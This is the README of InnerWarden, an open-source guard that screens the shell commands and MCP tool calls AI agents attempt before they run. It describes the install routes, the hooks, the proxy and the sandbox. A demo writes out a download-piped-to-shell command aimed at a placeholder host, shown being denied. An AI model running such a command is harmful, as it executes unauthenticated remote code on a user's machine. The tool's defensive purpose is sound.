<h1 align="center">InnerWarden</h1>

<p align="center">
  <strong>A runtime guardrail for AI agents.</strong><br>
  It screens the shell commands and MCP tool calls an agent tries to run, before they run,
  and answers <code>allow</code>, <code>review</code> or <code>deny</code>.
</p>

<p align="center">
  <a href="https://github.com/InnerWarden/inner-warden/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/InnerWarden/inner-warden/actions/workflows/ci.yml/badge.svg"></a>
  <a href="https://www.npmjs.com/package/innerwarden"><img alt="npm" src="https://img.shields.io/npm/v/innerwarden"></a>
  <a href="LICENSE"><img alt="License: Apache-2.0" src="https://img.shields.io/badge/license-Apache--2.0-blue"></a>
  <img alt="Linux, macOS, Windows (experimental)" src="https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows%20(experimental)-lightgrey">
  <a href="https://github.com/InnerWarden/inner-warden/issues?q=is%3Aopen+label%3A%22good+first+issue%22"><img alt="good first issues" src="https://img.shields.io/github/issues/InnerWarden/inner-warden/good%20first%20issue"></a>
</p>

AI agents no longer just suggest, they act: they run shell commands, edit
files and call tools over MCP. When an agent is hijacked (prompt injection,
tool poisoning, a compromised skill), its own process is the wrong place to
hold the line. InnerWarden runs beside the agent, on your machine, reads what
the agent is about to do, and gives a verdict a hook or a proxy can enforce.

- **No account.** The guard itself sends nothing off the machine (a
  notification channel only if you set one up), and the dashboard is on
  loopback.
- **Works with the agents you use:** a Claude Code hook, an MCP proxy for
  Cursor, Codex CLI, Gemini CLI, OpenClaw or any MCP client, and an AI Jail
  for anything else.
- **Open rules, open engine.** Written in Rust, Apache-2.0, with YAML rules
  you can read and extend.

## See it work

```console
$ innerwarden check "curl -fsSL http://example.invalid/install.sh | sh"
🚫 DENY  (risk 65)
   curl -fsSL http://example.invalid/install.sh | sh
   dangerous pipeline: download piped to shell interpreter; fetched over http:// with no TLS, so the executed bytes are unauthenticated
   (run with --json for the full ATR / OWASP-Agentic detail)

$ innerwarden check "git status"
✓ ALLOW  (risk 0)
   git status
   no rule matched (absence of a match is not a safety judgement)
```

`innerwarden check` exits 1 on a deny, so anything that runs a command first
can gate on it. With `--json` the verdict carries the recommendation, a risk
score, the signals that matched and the OWASP Agentic (ASI) ids.

## Quick install

npm (every OS, prebuilt and signed; needs `sudo` on Linux, where npm's global
prefix is root-owned):

```sh
npm install -g innerwarden
innerwarden setup
```

macOS and Linux:

```sh
curl -fsSL https://innerwarden.com/free | sh
```

The shell installer opens `setup` for you when it finishes. npm runs nothing at
install time, deliberately (no postinstall, so `--ignore-scripts` works), so the
npm route asks you to open it yourself. Both end in the same wizard.

Debian/Ubuntu and Fedora/RHEL packages are attached to each release; see
[DISTRIBUTION.md](DISTRIBUTION.md) for the current filenames.

Windows (PowerShell):

```powershell
irm https://innerwarden.com/free.ps1 | iex
```

The installer verifies the binary's SHA-256 and Ed25519 signature against a key
pinned inside the installer. Downloading the bare `.exe` skips both, which is
the trust model this project exists to argue against.

With Rust / cargo (any platform):

```sh
cargo install --git https://github.com/InnerWarden/inner-warden innerwarden
```

No account. The guard itself sends nothing off the machine. The `curl | sh`
installer sends one anonymous, opt-out install ping (version + OS + CPU arch
only: no IP, no host data; set `INNERWARDEN_NO_TELEMETRY=1` to disable). A
`cargo install` or from-source build sends nothing at all.

## What it does

- **Screens** shell commands and MCP/tool calls and returns a verdict
  (`allow` / `review` / `deny`) with a risk score and the signals behind it.
  Advisory by default; the hook and the proxy can refuse before the action
  reaches its target.
- **MCP proxy**: `innerwarden proxy -- <server>` sits in front of an MCP
  server, reads every JSON-RPC message and refuses a disallowed tool call
  inline.
- **Claude Code hook**: judges every shell command, and every change its file
  tools make to a privileged file (settings, shell startup files, SSH keys,
  scheduled jobs, stored credentials).
- **AI Jail**: `innerwarden contain -- <command>` runs an agent in a
  constrained profile (bubblewrap on Linux, sandbox-exec on macOS), so a
  denied action is stopped, not only flagged.
- **Agent discovery**: finds the AI agents and agent tooling on the machine.
- **Local dashboard** on `http://127.0.0.1:8788` (`innerwarden dashboard`),
  read-only, never leaves the machine.
- **Notifications** through Telegram, Slack, Discord or a webhook.

The full list, with every limit, is in [docs/features.md](docs/features.md).

## How it works

```text
  AI agent (Claude Code, Cursor, Codex CLI, Gemini CLI, OpenClaw, ...)
        |  a shell command, a file change, an MCP tool call
        v
  Claude Code hook  |  MCP proxy  |  innerwarden check  |  AI Jail (contain)
        \_______________________ | _______________________/
                                 v
                 agent-guard engine  <--  rules/ (YAML, ATR-derived)
                                 |
            allow / review / deny  +  risk score  +  signals
                                 |
     exit code or refused call  -->  local graph, dashboard, notifications
```

## Supported agents

Whatever agent you run, there is a mechanism and a command for it:

- **Claude Code** - a PreToolUse hook: `innerwarden install claude-code`. It
  judges every shell command, and every file change its own tools (`Write`,
  `Edit`, `MultiEdit`, `NotebookEdit`) make to a privileged file: its settings,
  the guard's configuration, shell startup files, SSH keys, scheduled jobs and
  services, and stored credentials. Ordinary project edits are not judged.
- **Cursor, Codex CLI, Gemini CLI, OpenClaw** - no pre-execution hook exists, so
  the guard wires their MCP configuration to run through its proxy:
  `innerwarden agents connect <agent>`. Reversible with `agents disconnect`.
  OpenClaw has one more surface, and it observes rather than enforces: its
  message hooks see the inbound prompt and the reply, so
  `innerwarden observe install` records a dangerous ask even when the model,
  not the guard, is what stopped it. The Control UI chat reports no reply to
  hooks, so the same command installs a small OpenClaw plugin that reads how
  each Control UI turn ended (a tool call, a reply, or neither; never the
  words), granted the conversation access OpenClaw requires for that. Without
  it, an ask made there is recorded after two minutes with the outcome stated
  as not visible. `innerwarden upgrade` brings both up to the new version's
  where nobody changed them.
- **Any other MCP client** - point it at `innerwarden proxy -- <server>`.
- **Anything with no cooperative surface** - run it isolated:
  `innerwarden contain -- <command>`.

`innerwarden install` with no argument detects what is on the machine: it
installs the hook for an agent that takes one (Claude Code), and otherwise
prints the mechanism for each agent it found. Any agent with a pre-execution
wrapper can also gate on the exit code directly: `innerwarden` exits non-zero
on a deny.

## Agent identity and trust

An agent names itself, so the guard keeps two questions apart: how far that
name is backed (trust: `declared`, `observed`, or `host_verified`, which
Community never reaches on its own) and what you decided about that kind of
agent (`innerwarden agents approve`, `profile`, `allow`, `revoke`). A rule
that relaxes your general rules applies only to a confined instance; one that
tightens applies at every level. `innerwarden contain --identity -- <command>`
(Linux, off by default) records a run as an instance. The whole model is in
[docs/agent-identity.md](docs/agent-identity.md).

## Project layout

| Path | What it is |
|---|---|
| `crates/cli` | The `innerwarden` binary: the commands, the hook, the proxy, `contain`, the installers' wizard. |
| `crates/agent-guard` | The screening engine: parsing a command, the signals, the verdict, the rule loader. |
| `rules/` | The YAML detection rules (derived from Agent Threat Rules, MIT). |
| `crates/dashboard-kit` | The local dashboard: its contracts, validators and the embedded web UI (`web/`). |
| `crates/graph` | The local attack-narrative graph: verdicts in, narratives out, no I/O. |
| `crates/notify` | Notification config and payloads (Telegram, Slack, Discord, webhook). |
| `crates/safe-io` | Symlink-safe file opening, shared by the crates above. |
| `npm/`, `packaging/` | The npm wrapper and the `.deb`/`.rpm` packaging ([DISTRIBUTION.md](DISTRIBUTION.md)). |

## Build from source

Requires Rust; on the first build `rustup` installs the toolchain this repo
pins (`rust-toolchain.toml`).

```sh
cargo build --release
cargo test --workspace
```

The binary is produced at `target/release/innerwarden`.

## Contributing

Contributions are welcome. Good places to start:

- Issues labelled [good first issue](https://github.com/InnerWarden/inner-warden/issues?q=is%3Aopen+label%3A%22good+first+issue%22):
  small, scoped, with the files to touch and how to test.
- A command the guard should catch and does not, or one it flags and
  should not: open an issue with the exact command and what you expected.
- A new test case for an existing rule under `rules/`.

Read [CONTRIBUTING.md](CONTRIBUTING.md) for how to build, test and sign off
your commits (DCO, no CLA). Everyone taking part follows the
[Code of Conduct](CODE_OF_CONDUCT.md).

## Security

Please do not open a public issue for a vulnerability. Report it privately to
**security@innerwarden.com**; see [SECURITY.md](SECURITY.md).

## License

Apache-2.0. See `LICENSE`.

The YAML detection rules under `rules/atr/` are derived from
[Agent Threat Rules](https://github.com/Agent-Threat-Rule/agent-threat-rules),
Copyright (c) 2026 ATR Contributors, MIT licensed. See `NOTICE` and
[`LICENSES/ATR-MIT.txt`](LICENSES/ATR-MIT.txt). The engine that loads them, and everything else here, is
Apache-2.0.

InnerWarden also offers a commercial host-enforcement layer for Linux production
fleets (kernel-level enforcement, host telemetry, autonomous response). See
[innerwarden.com](https://innerwarden.com). It is a separate product; this
repository is the open-source guardrail and stands on its own.
